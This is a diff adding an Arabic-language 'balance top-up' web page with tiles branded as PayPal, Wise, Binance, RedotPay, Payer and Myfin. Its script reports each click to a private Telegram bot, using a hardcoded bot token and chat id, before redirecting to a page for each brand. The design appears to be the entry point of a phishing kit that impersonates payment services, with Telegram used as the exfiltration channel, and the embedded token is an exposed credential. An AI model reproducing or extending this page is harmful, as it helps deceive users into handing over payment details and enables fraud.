@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>شحن أرصدة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      direction: rtl;
+      color: white;
+    }
+
+    .glass-container {
+      background: rgba(0, 0, 0, 0.1);
+      border-radius: 20px;
+      padding: 20px;
+      width: 350px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 30px;
+      text-align: center;
+    }
+
+    .option-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+
+    .option-wrapper:hover {
+      transform: scale(1.05);
+    }
+
+    .option-wrapper img {
+      width: 130px;
+      height: 130px;
+      object-fit: cover;
+      border-radius: 18px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.15);
+      background-color: rgba(255, 255, 255, 0.05);
+    }
+
+    .option-wrapper span {
+      margin-top: 12px;
+      font-size: 17px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="glass-container">
+    <div class="option-wrapper" onclick="sendAndRedirect('Payer', 'payer.html')">
+      <img src="payer.png" alt="Payer">
+      <span>Payer</span>
+    </div>
+    <div class="option-wrapper" onclick="sendAndRedirect('Wise', 'wise.html')">
+      <img src="wise.png" alt="Wise">
+      <span>Wise</span>
+    </div>
+    <div class="option-wrapper" onclick="sendAndRedirect('RedotPay', 'redotpay.html')">
+      <img src="redotpay.png" alt="RedotPay">
+      <span>RedotPay</span>
+    </div>
+    <div class="option-wrapper" onclick="sendAndRedirect('Myfin', 'myfin.html')">
+      <img src="myfin.png" alt="Myfin">
+      <span>Myfin</span>
+    </div>
+    <div class="option-wrapper" onclick="sendAndRedirect('PayPal', 'paypal.html')">
+      <img src="paypal.png" alt="PayPal">
+      <span>PayPal</span>
+    </div>
+    <div class="option-wrapper" onclick="sendAndRedirect('Crypto', 'crypto.html')">
+      <img src="crypto.png" alt="Crypto">
+      <span>Binance</span>
+    </div>
+  </div>
+
+  <script>
+    function sendAndRedirect(method, redirectPage) {
+      const token = '7541294448:AAEbnzKns8iQnv01Q6wgTmRyNhqEBDpxCqo';
+      const chat_id = '7739393558';
+      const message = `✅ تم اختيار وسيلة الشحن:\n${method}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          window.location.href = redirectPage;
+        } else {
+          alert("❌ فشل في الإرسال إلى Telegram");
+        }
+      }).catch(error => {
+        alert("⚠️ حدث خطأ: " + error);
+      });
+    }
+  </script>
+
+</body>
+</html>
